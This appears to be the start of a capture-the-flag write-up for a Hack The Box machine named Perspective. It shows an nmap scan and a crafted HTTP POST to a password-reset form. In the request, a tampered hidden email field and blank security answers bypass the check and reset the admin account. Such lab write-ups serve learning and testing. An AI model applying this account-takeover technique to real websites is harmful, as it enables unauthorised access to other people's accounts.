# Enumeration
## Nmap
```bash
nmap -sC -sV -oA nmap/perspective 10.10.11.151

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 d67f3fd42215ce64f3c80079bff6f8f8 (RSA)
|   256 08c6d4f398840ffd4bede3a625bde770 (ECDSA)
|_  256 32816a8b4df96109ffd3996ce73fa3ac (ED25519)
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Port 80
redirect -> http://perspective.htb/

Creating an account, and checking how password reset works, shows that you just need the security questions.

You can bypass the user name check by changing it when entering the security questions.
```
POST /Account/Forgot HTTP/1.1
Host: perspective.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 356
Origin: http://perspective.htb
Connection: close
Referer: http://perspective.htb/Account/Forgot
Upgrade-Insecure-Requests: 1

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKMTE4MzYyMzczM2RkYNV%2BZt7yOSGiDlCo7fFB5yLGtBQ%3D&__VIEWSTATEGENERATOR=B97FD74E&ctl00%24MainContent%24EmailHidden=admin%40perspective.htb&ctl00%24MainContent%24QuestionResponse1=&ctl00%24MainContent%24QuestionResponse2=&ctl00%24MainContent%24QuestionResponse3=&ctl00%24MainContent%24ctl01=Initiate+Reset
```